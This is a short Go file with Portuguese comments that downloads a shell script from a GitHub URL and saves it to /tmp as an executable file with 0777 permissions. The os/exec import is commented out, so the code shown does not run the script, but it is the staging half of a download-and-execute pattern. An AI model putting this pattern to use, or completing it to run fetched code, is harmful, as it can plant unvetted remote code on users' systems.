package main



import  (


"net/http"
"io/ioutil"
"fmt"
//"os/exec"
//"os"
)


               
var   url_down   string  =  "https://github.com/atilabyte/IA/raw/refs/heads/main/down.sh"



func  down_atila_vkzmn_sh() {



req  := http.Client{}


resp , err_get := req.Get(url_down)


if  err_get   != nil {


fmt.Println(err_get) //tente abaixa denovo

return 

}

down_bytes  , err_readall :=  ioutil.ReadAll(resp.Body)

if err_readall != nil {

fmt.Println("erro em readall")

return 

}


ioutil.WriteFile("/tmp/atila_vkzmn.sh",  down_bytes ,  0777 )




}














